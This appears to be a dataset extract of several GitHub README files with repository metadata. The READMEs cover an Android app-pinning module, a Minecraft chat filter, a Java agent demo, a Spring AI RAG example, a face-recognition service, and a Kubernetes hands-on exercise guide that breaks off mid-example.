One key point about future work is that *a lot* more testing needs to be done.
We know that JarPlant in its current state will fail to spike many JARs in the wild.
We're also concerned about compatibility between different Java versions.
All of this needs to be set up with test automation.

",0,0,1,LGPL-2.1
HChenX/PinningApp,master,"<div align=""center"">
<h1>固定应用(Pinning App)</h1>

![stars](https://img.shields.io/github/stars/HChenX/PinningApp?style=flat)
![downloads](https://img.shields.io/github/downloads/HChenX/PinningApp/total)
![Github repo size](https://img.shields.io/github/repo-size/HChenX/PinningApp)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/HChenX/PinningApp)](https://github.com/HChenX/PinningApp/releases)
[![GitHub Release Date](https://img.shields.io/github/release-date/HChenX/PinningApp)](https://github.com/HChenX/PinningApp/releases)
![last commit](https://img.shields.io/github/last-commit/HChenX/PinningApp?style=flat)
![language](https://img.shields.io/badge/language-java-purple)

<p><b><a href=""README-en.md"">English</a> | <a href=""README.md"">简体中文</a></b></p>
</div>

### 模块介绍:

- 模块通过调用安卓自有的固定应用功能实现对应用的固定。
- 上层建筑比如：
- 触发固定方式、忽略退出手势、拒绝弹出侧边栏、退出固定息屏、
- Pad： 拒绝呼出Dock栏，拒绝响应小窗手势，隐藏小白条。
- 等上述功能均为模块自身实现，不依赖原生安卓的固定应用功能。
- ~~本模块功能类似于IOS的引导式访问~~

### 模块效果：

- 当进入固定模式时，手机将被固定显示一个App，系统返回等手势将失效。
- 如下是GIF动图展示：

![GIF](https://github.com/HChenX/PinningApp/blob/master/pinning_app_gif.gif)

- 无法查看点击[此处](https://github.com/HChenX/PinningApp/blob/master/pinning_app_gif.gif)

### 使用方法：

- 首先确定你是小米手机，模块只支持小米手机！当然如果你有办法可以为本项目PR，来获得更广泛的支持！
- 其次下载本模块并勾选推荐的作用域，然后重启手机！
- 重启完成模块即正在运行。

##### 开关固定模式：

- 在应用界面长按通知栏1~2秒即可进入，如果失败请确定期间手指没有移动！
- 进入时会有Toast提示，如果出现提示即成功进入
- 再次在本应用界面长按通知栏1~2秒即可退出！同样也会有Toast提示！

##### 开关`退出固定时锁屏`功能：

- 打开MT或其他可以执行Shell命令的软件。
- 执行`su`回车获取ROOT权限，这是必要的！！
- 执行`pm pinning -l 0`为关闭本功能；
- 执行`pm pinning -l 1`为开启本功能。
- 执行`pm pinning -l -g`可获取本功能状态。
- 获取详细帮助可执行`pm pinning -h`

###### `退出固定时锁屏`功能效果：

- 开启后在退出固定模式时将强制跳转到锁屏密码界面。
- ~~妈妈再也不用担心手机隐私被别人看见啦！~~

##### 开关`固定时拒绝弹出侧边栏`功能：

- 打开MT或其他可以执行Shell命令的软件。
- 执行`su`回车获取ROOT权限，这是必要的！！
- 执行`pm pinning -s 0`为关闭本功能；
- 执行`pm pinning -s 1`为开启本功能。
- 执行`pm pinning -s -g`可获取本功能状态。
- 获取详细帮助可执行`pm pinning -h`

###### `固定时拒绝弹出侧边栏`功能效果：

- 顾名思义，开启后进入固定模式不能呼出侧边栏。

##### 使用时常见问题：

- Q：为什么我没有成功进入？ A：可能长按时间偏短或者手指移动，请再试。
- Q：为什么在桌面时长按无效？ A：模块暂不支持在桌面时进入固定模式。
- Q：为什么提示“`请在被锁定应用界面解锁”？ A：你通过某种手段切换了界面，需要在进入固定模式的App界面解锁。但无需担心，超过一定次数会自动解除固定模式。
- Q：为什么模块没有工作？ A：请带上Lsp日志等信息反馈，虽然我修的概率很小。

### 项目感谢：

- 感谢Android官方提供本功能的基本底层支持！
- 感谢Xposed工具提供强大的Hook支持！
- 感谢DexKit工具对本模块功能性支持！
- 感谢[Sevtinge](https://github.com/Sevtinge)对本模块适配Pad做出的贡献！

### 项目要求：

- 本项目完全开源！
- 但是也请遵守GPL3.0的开源协议！
- 任何使用本模块必须注明作者和GitHub地址！
- 对本模块有任何要求请不要疯狂Call作者，请自行PR，我没有义务实现你的功能或适配你的手机！

### 交流群：

- QQ：517788148
- 电报：t.me/HChen_AppRetention

### 赞助我：

- 爱发电：[焕晨HChen](https://afdian.net/a/HChen)

",1,2,1,GPL-3.0
ssssdl/fastjsonChecker,master,,1,3,2,
HaHaWTH/AdvancedSensitiveWords,pro,"# AdvancedSensitiveWords
If you trigger the sensitive word test you'll be penalised.
One-stop-shop **ultimate** anti-swear solution for your Minecraft server!

![](https://socialify.git.ci/HaHaWTH/AdvancedSensitiveWords/image?description=1&descriptionEditable=One-stop-shop%20ultimate%20anti-swear%20solution%20for%20Minecraft&font=Inter&language=1&name=1&stargazers=1&theme=Auto)

[![Available on SpigotMC](https://img.shields.io/badge/Available%20on%20SpigotMC-orange?style=for-the-badge&logo=SpigotMC&logoColor=FFFFFF)](https://www.spigotmc.org/resources/advancedsensitivewords.115484/)

<p align=""center"">
  <img src=""logo.webp"" alt=""logo"" width=""128"" height=""128""/>
</p>

Logo designed by GPT-4

[![CodeFactor](https://www.codefactor.io/repository/github/hahawth/advancedsensitivewords/badge)](https://www.codefactor.io/repository/github/hahawth/advancedsensitivewords)
[![QQ](https://img.shields.io/badge/QQ-361581545-blue)](https://qm.qq.com/q/sC52yJDrGi)

## Features
1. Using DFA(Deterministic Finite Automata) algorithm
2. Plug-and-play
3. Huge and high-quality default dictionary (Over 60,000 words)
4. Blazing fast by using packets (32,000+ queries per second on a 2-core server)
5. 100% compatibility with chat plugins (Tested over 30+ plugins)
6. Full-customizable
7. Sign check support
8. Anvil check support
9. Book check support
10. Player name check support
11. **Chat context check**
12. **Sign multiple lines check**
13. **Book check with ignore lines support and cache**
14. Bedrock player compatibility
15. Compatibility with main stream login plugins (AuthMe, CatSeedLogin etc.)
16. Emoji and other unicode support
17. Chinese support
18. Fast processing depending on our custom data structure
19. Online sensitive word list support ([Repository here](https://github.com/HaHaWTH/ASW-OnlineWordList))
20. Folia supported
21. OP notifications on player swore
22. Custom punishments (Effect, command, hostile, etc.)
23. Fake message support (Inspired by [Bilibili Avalon System](https://github.com/freedom-introvert/Research-on-Avalon-System-in-Bilibili-Comment-Area))
24. PlaceHolder API expansion support
25. AI powered moderation system

**Features above make us unique in the anti-swear plugins!**

## How does this plugin work?

```mermaid
graph TD
    A[Player Interaction] --> B[Event Listeners]
    C[Player Packet] --> D[Packet Listeners]
    B --> E[Regex Preprocess]
    D --> E[Regex Preprocess]
    E --> F[DFA Match]
    F -->|Matched| G[Result]
    G --> J[Replace]
    G --> K[Cancel]
    F -->|Not Matched| H[AI Processor]
    H -->|LLMs| I[Rating]
    I --> L[Punish]
```

## Commands

`/asw help` - Show help message

`/asw reload` - Re-initialize the DFA dict and reload configurations

`/asw status` - Show the status of the AdvancedSensitiveWords

`/asw test <text>` - Test the AdvancedSensitiveWords filter with given text

`/asw info <player>` - Check total violations of specific player from database

`/asw punish <player> [type]` - Punish a player with a specific type

## Permissions

`advancedsensitivewords.bypass` - Bypass the AdvancedSensitiveWords message filter

`advancedsensitivewords.reload` - Allows you to use the /asw reload command

`advancedsensitivewords.status` - Allows you to use the /asw status command

`advancedsensitivewords.test` - Allows you to use the /asw test command

`advancedsensitivewords.help` - Allows you to use the /asw help command

`advancedsensitivewords.notice` - Retrieve the notification when players swore

`advancedsensitivewords.info` - Ability to use /asw info command

`advancedsensitivewords.update` - Receive update notifications

`advancedsensitivewords.punish` - Allows you to use the /asw punish command

**For more info, please visit [our Wiki](https://github.com/HaHaWTH/AdvancedSensitiveWords/wiki)**

## Supported Platforms
- Spigot(stable)
- Velocity(stable)
- BungeeCord(stable)
- Sponge(WIP)
- Fabric(Planned)
- Forge/NeoForge(Coming s∞n)

## Known Incompatibilities
- [HuskChat (Only proxy mode)](https://github.com/WiIIiam278/HuskChat)

## Statistics
[![](https://img.shields.io/bstats/servers/20661?label=Spigot%20Servers&style=for-the-badge)](https://bstats.org/plugin/bukkit/AdvancedSensitiveWords/20661)

[![](https://img.shields.io/bstats/players/20661?label=Online%20Players&style=for-the-badge)](https://bstats.org/plugin/bukkit/AdvancedSensitiveWords/20661)

## Open-source projects used
- **[Ollama4j(Modified to support Java 8)](https://github.com/ollama4j/ollama4j)**
- **[OpenAI4j](https://github.com/ai-for-java/openai4j)**
- **[packetevents(Used for handling chat & book packets)](https://github.com/retrooper/packetevents)**
",4,0,3,AGPL-3.0
JAgentSphere/bytebuddy-agent-demo,main,"# Agent-Demo

使用 Byte Buddy 和 Gradle 构建一个最简单的 Java Agent

Java Agent 的入口类是 `com.jas.agent.Main`

```java
public class Main {
    public static void premain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    public static void agentmain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    private static void launch(String args, Instrumentation inst) {
        System.out.println(""hello java agent"");
    }
}
```

提供 AgentBuilder 最简化便利测试的配置项

```java
AgentBuilder agentBuilder = new AgentBuilder.Default()
        .ignore(ElementMatchers.none()) // 忽略空，即允许 hook 所有类
        .with(AgentBuilder.RedefinitionStrategy.REDEFINITION) // 开启类被加载后也允许进行字节码修改
        .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly()) // 字节码修改失败打印错误信息到控制台
        .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly()) // 字节码修改成功也输出到控制台
        .with(new DumpClassListener()); // 字节码修改成功把类信息给报错到 weaving/classes 目录下
```

## 编译

在项目目录下执行如下命令，会在 test 文件夹中生成 agent.jar 和 demo.jar

```shell

# linux or macos
./gradlew jar

# windows
gradlew.bat jar
```

## 启动 Java Agent

使用如下命令挂载 agent 启动 SpringBoot 程序，会打印 `hello java agent`

```shell
cd test && \
  java -javaagent:agent.jar -jar demo.jar
```",4,0,3,MIT
jlokitha/group_chat_app,master,,0,0,1,MIT
YiRanMushroom/GTCEuAO,master,,55,4,2,MIT
JNNGL/VanillaMinimaps,main,,2,16,2,GPL-3.0
habuma/spring-ai-rag-example,main,"Spring AI RAG Example
---
Simple example to load the entire text of a document into a vector store and
then expose an API through which questions can be asked about the document's
content.

> IMPORTANT: This project has been copied into the
[Spring AI Examples repository](https://github.com/habuma/spring-ai-examples) and will no longer be maintained here.
I'm keeping it here for now, but for future updates, see
the Spring AI Examples repository.

Before running the application, you'll need to acquire an OpenAI API key.
Set the API key as an environment variable named `OPENAI_API_KEY`. E.g.,

```
$ export OPENAI_API_KEY=sk-1234567890abcdef1234567890abcdef
```

You'll also need a document for it to load. Set the `app.resource` property
in src/main/resources/application.properties to the resource URL of the
document. It is set to load the Wikipedia page for the game of Chess, but
you can change it to something else. For example:

```
app.resource=file:///Users/someuser/Spring_in_Action_SixthEdition.pdf
```

The resource URL can be a file, classpath, or even an HTTP URL. The file
itself can be any document type supported by Apache Tika, including PDF,
Word, HTML, and more.

Then run the application as you would any Spring Boot application. For
example, using Maven:

```
$ mvn spring-boot:run
```

The first time you run it, it will take a little while to load the document into
the vector store (which will be persisted at /tmp/vectorstore.json). Subsequent
runs will just use the persisted vector store and not try to load the document again.
(This means that if you change the document resource, you'll need to delete
/tmp/vectorstore.json so that it will be reloaded.)

Then you can use `curl` to ask questions:

```
$ curl localhost:8080/ask -H""Content-type: application/json"" -d '{""question"": ""What annotation should I use to create a REST controller?""}'
```

> The question shown in the example was used to ask questions against my book,
[Spring in Action, 6th Edition](https://www.manning.com/books/spring-in-action-sixth-edition?a_aid=habuma&a_bid=f205d999&chan=habuma).
You'll want to ask questions relevant to whatever document you're using.

Or with HTTPie it's a little easier:

```
http :8080/ask question=""What annotation should I use to create a REST controller?""
```
",0,0,1,
qjx378/face-service,master,"<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">人脸识别服务</h1>
<h4 align=""center"">基于Spring Boot服务架构</h4>
<p align=""center"">
  <a href=""https://gitee.com/qjx378/face-service/stargazers""><img src=""https://gitee.com/qjx378/face-service/badge/star.svg?theme=dark""></a>
  <a href=""https://gitee.com/qjx378/face-service""><img src=""https://img.shields.io/badge/FaceService-v0.0.1-brightgreen.svg""></a>
  <a href=""https://gitee.com/qjx378/face-service/blob/master/LICENSE""><img src=""https://img.shields.io/github/license/qjx378/face-service""></a>

</p>

## **简介**
基于开源人脸检测AI模型，通过利用Java技术和向量搜索技术提供包括人脸检测与分析、比对、搜索、验证、五官定位、活体检测等API接口服务功能，为开发者和企业提供高性能高可用的人脸识别服务。可应用于在线娱乐、在线身份认证等多种应用场景，充分满足各行业客户的人脸属性识别及用户身份确认等需求。
<br><br>
关于中科视拓开源人脸模型（SeetaFace6），您可以访问[https://github.com/SeetaFace6Open/index](https://github.com/SeetaFace6Open/index)了解更多。
<br>
SeetaFace6入门教程[https://github.com/seetafaceengine/SeetaFaceTutorial](https://github.com/seetafaceengine/SeetaFaceTutorial)了解更多。

## **技术架构**
基于Spring Boot+MySQL+Milvus的技术组合，接口采用RESTful API定义，通过JNI（Java Native Interface）技术调用底层的人脸识别模型，实现人脸的检测与识别。

## **接口范围**
本API服务主要专注于提供包括人脸检测与分析、比对、搜索、验证、五官定位、活体检测等API接口服务，在该API服务中实现人脸检测与分析、五官定位、人脸比对、人脸库管理、人脸搜索、人脸静态活体检测，主要包括如下API对外接口：

1）人脸检测与分析<br>
对请求图片检测返回人脸的位置、面部属性；对请求图片进行五官定位，计算构成人脸轮廓的68个点

2）人脸比对<br>
对两张图片中的人脸进行相似度比对，返回人脸相似度分数。

3）人脸库管理<br>
包括增、删人脸库，人脸库增、删人脸。

3）人脸搜索<br>
给定一张待识别的人脸图片，在一个或多个人脸库中识别出最相似的前 N 个人脸。

4）人脸静态活体检测<br>
对用户上传的静态图片进行防翻拍活体检测，以判断是否是翻拍图片。

# **系统需求**
JDK >= 21 <br>
Maven >= 3.0 <br>
MySQL >= 8.0 <br>
Milvus >= 2.3

# **技术选型**
- 系统环境 <br>
Java EE 21 <br>
Servlet 6.0 <br>
Apache Maven 3

- 主框架 <br>
Spring Boot 3.2.x <br>
Spring Framework 6.0.x <br>

- 持久层 <br>
Spring JDBC

## **部署方式**
1. 下载模型文件（百度网盘：https://pan.baidu.com/share/init?surl=LlXe2-YsUxQMe-MLzhQ2Aw 提取码：ngne），将下载的所有*.csta模型文件放入某个路径下，在启动服务前，修改spring配置文件中的app.seetaface.model-path属性，指向存放模型文件夹的路径。
2. 修改spring配置文件中的face-image-path，用于存放人脸图片的文件夹。

## 在线体验
演示地址：[https://face.izerofx.com](https://face.izerofx.com/)
- 服务器配置较低，对体验有一定的影响。

## **演示图**
注：该工程不包含示例页面，以下示例页面UI、素材取自网络，仅用于演示使用。
<table>
    <tr>
        <td><img src=""https://res.file.izerofx.com/face-service/1.png""/></td>
        <td><img src=""https://res.file.izerofx.com/face-service/2.png""/></td>
    </tr>
    <tr>
        <td><img src=""https://res.file.izerofx.com/face-service/3.png""/></td>
        <td><img src=""https://res.file.izerofx.com/face-service/4.png""/></td>
    </tr>
</table>
",0,4,1,Apache-2.0
seifrajhi/Kubernetes-practical-exercises-Hands-on,main,"# Practical Kubernetes Exercices

This repo provides some resources to learn Kubernetes through practical exercises for self study to learn how easy it is to understand and master Kubernetes complexity and problems.

Kubernetes is easy to understand, even if it looks hard at the first look on the icons or the resources map, this course is about to help you to understand K8s and learn how to start!

![icons-all](images/icons-all.png ""icons-all"")

![k8s-resources-map](images/k8s-resources-map.png ""k8s-resources-map"")


## Prerequisites

It would be nice if you know what `kubectl` is and have a basic understanding of running conatiners with docker / containerd or cri-o.

## Preparation

To get prepared please install at least kubectx and kns with krew from this list and make sure to have bash completion for kubectl in place:

## Tools we use

- [mkcert](https://github.com/FiloSottile/mkcert)
- watch  
  - Mac setup:
    ````
    brew install watch
- [oh-my-zsh](https://github.com/ohmyzsh/ohmyzsh)
  - activate autocompletion
    - [Mac setup](https://docs.brew.sh/Shell-Completion)
    - [kubectl plugin](https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl)
- [git](https://git-scm.com/)
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)  
  - mac setup:
    ```
    brew install kubernetes-cli
- [kubectx & kubens](https://github.com/ahmetb/kubectx)


[The Golden Kubernetes Tooling and Helpers list](http://bit.ly/kubernetes-tooling-list)

We can use any Kubernetes cluster (> 1.21) on our local machine or in the cloud. For online trainings we recommend to have either k3s installed with k3d, use Kind, or Docker for Desktop.  

We'll use some slides from:

[Kubernauts Kubernetes Trainings Slides](https://goo.gl/Hzk2sd)

and refer to some resources from:

[Kubernauts Kubernetes Learning Resources List](https://goo.gl/Rywkpd)

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security
 
The Security checklist aims at providing a basic list of guidance with links to more comprehensive documentation on each topic. It does not claim to be exhaustive and is meant to evolve.

1- https://kubernetes.io/docs/concepts/security/security-checklist/

2- https://github.com/magnologan/awesome-k8s-security

3- https://github.com/freach/kubernetes-security-best-practice

4- https://medium.com/@seifeddinerajhi/kubernetes-security-assessment-guidelines-and-necessary-checklist-9a326f341b68

5- https://medium.com/@seifeddinerajhi/owasp-kubernetes-top-10-a-comprehensive-guide-f03af6fd66ed

6- https://eksclustergames.com:  Kubernetes CTF (Capture The Flag) challenges for EKS.

7- https://github.com/andifalk/secure-development-on-kubernetes: Slides and Demos for ""Secure Development on Kubernetes"" talk


7- [A curated list for Awesome Kubernetes Security resources](https://github.com/magnologan/awesome-k8s-security) - A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos.


8- [Kubernetes Security Checklist and Requirements](https://github.com/Vinum-Security/kubernetes-security-checklist) - Kubernetes Security Checklist and Requirements - All in One (authentication, authorization, logging, secrets, configuration, network, workloads, dockerfile).

9- [Kubernetes Hardening Manual](https://github.com/seifrajhi/kubernetes-hardening-checklist-guidance) -  Kubernetes Hardening Guidance.


### Storage

- The key concepts of Kubernetes storage, including [PVs, PVCs, and StorageClass](https://medium.com/@seifeddinerajhi/understanding-storage-in-kubernetes-ee2c19001aae)

### Misc

- Kelsey Hightower's open-source guide, [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way), goes through how to bootstrap a Kubernetes cluster without the use of installers or scripts. 


- [Learnk8s](https://learnk8s.io/): Develop the knowledge and skills to get the most out of Kubernetes with hands-on online courses and instructor-led classes.

- [Introduction to Kubernetes Lecture Notes](https://github.com/kaan-keskin/introduction-to-kubernetes/tree/main): Notes about Kubernetes resources  

- [Kubernetes Handbook](https://github.com/rootsongjc/kubernetes-handbook)

- [Kubeapps](https://github.com/vmware-tanzu/kubeapps): A web-based UI for deploying and managing applications in Kubernetes clusters

- [Start learning Kubernetes today](https://kubebyexample.com/)

- [Step by step guide to learning Kubernetes](https://roadmap.sh/kubernetes)

- [Kubernetes the Harder Way](https://github.com/ghik/kubernetes-the-harder-way) A guide to setting up a production-like Kubernetes cluster on a local machine


- [Kubernetes mind map](https://betterprogramming.pub/6-important-things-you-need-to-run-kubernetes-in-production-d573d61258c5): 6 Important Things You Need to Run Kubernetes in Production.

- [Awesome Kubernetes Resources](https://github.com/tomhuang12/awesome-k8s-resources) - A curated list of awesome Kubernetes tools and resources.

### Useful aliases

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
alias k=""kubectl""
alias kx=""kubectx""
alias kn=""kubens""
alias kgp=""kubectl get pods""
alias kgel=""k get events --sort-by=.metadata.creationTimestamp""
```
</p>
</details>


## Kubectl CheatSheet and Goodies

https://kubernetes.io/docs/reference/kubectl/cheatsheet/

https://github.com/dennyzhang/cheatsheet-kubernetes-A4

<details><summary>Expand here to see the solution</summary>
<p>

```bash
k get events --sort-by=.metadata.creationTimestamp # List Events sorted by timestamp

k get services --sort-by=.metadata.name # List Services Sorted by Name

k get pods --sort-by=.metadata.name

k get endpoints

k explain pods,svc

k get pods -A # --all-namespaces 

k get nodes -o jsonpath='{.items[*].spec.podCIDR}'

k get pods -o wide

k get pod my-pod -o yaml --export > my-pod.yaml  # Get a pod's YAML without cluster specific information

k get pods --show-labels # Show labels for all pods (or other objects)

k get pods --sort-by='.status.containerStatuses[0].restartCount'

k cluster-info

k api-resources

k api-resources -o wide

kubectl api-resources --verbs=list,get # All resources that support the ""list"" and ""get"" request verbs

k get apiservice
```
</p>
</details>

### k create namespace imperative via declarative

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create ns <namespace name, e.g. your name or your project!>
k create ns --dry-run test -o yaml > test-ns.yaml
k create -f test-ns.yaml
k delete ns test
```

</p>
</details>

### k create / run pods or deploymens with dry-run

<details>
   <summary>Expand here to see the solution</summary>
<p>

```yaml
# old school (going to get deprecated)
k run --generator=run-pod/v1 <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

k run --generator=run-pod/v1 ""nginx-pod"" --image=nginx -o yaml --dry-run > nginx-pod.yaml

or

k run --restart=Never <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

or (new school with --dry-run=client)

k run nginx-pod --image=nginx -o yaml --dry-run=client > nginx-pod.yaml

k create <object> <name> <options> --dry-run -o yaml > <objectname.yaml>

k create deployment nginx-deployment --image=nginx --dry-run -o yaml > nginx-deployment.yaml

cat nginx-pod.yaml

cat nginx-deployment.yaml

k create -f nginx-pod.yaml

# create a service via exposing the pod

k expose pod nginx-pod --port=80

k get svc

k port-forward service/nginx-pod 8080:80

or

k proxy

open http://127.0.0.1:8001/api/v1/namespaces/default/pods/nginx-pod/proxy/

# open a new terminal session

curl http://127.0.0.1:8080/

k delete all --all # with caution!!!

k create -f nginx-deployment.yaml

k get all

k get all -A

k expose deployment nginx-deployment --port=80

k port-forward service/nginx-deployment 8080:80

k scale --replicas 3 deployment nginx-deployment

k edit deployment nginx-deployment

vi nginx-deployment.yaml # adapt the number of replicas, e.g. to 2

k apply -f nginx-deployment.yaml

```
</p>
</details>

### k get events and logs, describe objects

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
kx
kn
k delete all --all # with caution!!!
k apply -f 0-nginx-all.yaml
k get all
# where is the ingress?
k get ingress # ingress objects are not namespaced
k get events
k get events -A
k get events -n <namespace name>
k logs nginx-<press tab>
k describe pod nginx-<press tab>
k describe deployment nginx
k describe replicasets nginx-<press tab>
```
</p>
</details>

### Merging contexts (e.g. merge 2 kubeconfigs from 2 cluster contexts)

Sometimes you'll need to merge multiple kubeconfigs into a single file, here you go:

<details><summary>Expand here to see the solution</summary>
<p>

```bash
KUBECONFIG=file1:file2:file3 kubectl config view --merge --flatten > my_new_kubeconfig
or
cp ~/.kube/config ~/.kube/config.bak
KUBECONFIG=/my/new/kubeconfig:~/.kube/config.bak kubectl config view --flatten > my_new_kubeconfig
# test it
export KUBECONFIG=my_new_kubeconfig
kx
cp my_new_kubeconfig ~/.kube/config
```
</p>
</details>

Don't miss: Mastering the KUBECONFIG file by Ahmet Alp Balkan:

https://ahmet.im/blog/mastering-kubeconfig/

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

#### Further reading:

Since K8s secrets are not so secret, there are some ways to keep you secrets secret:

https://learnk8s.io/kubernetes-secrets-in-git

https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/#create-a-pod-that-has-access-to-the-secret-data-through-environment-variables



### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat 0-nginx-configmap.yaml
k create -f 0-nginx-configmap.yaml
```
</p>
</details>



## Whoami, Whoareyou and Whereami Problems

### What We’ll Do

We’ll use a pre-made container — containous/whoami — capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

We’ll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

We’ll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

We’ll define two services, one for each of our Pods.

We’ll define Ingress objects to define the routes to our services to the outside world.

We’ll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a “deployment” (kind: Deployment)

The name of the object is “whoami-deployment” (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: …) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)
```

</p>
</details>

## DNS based Service discovery with whereami kubia pod

### What We’ll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko Lukša](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```
</p>
</details>

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
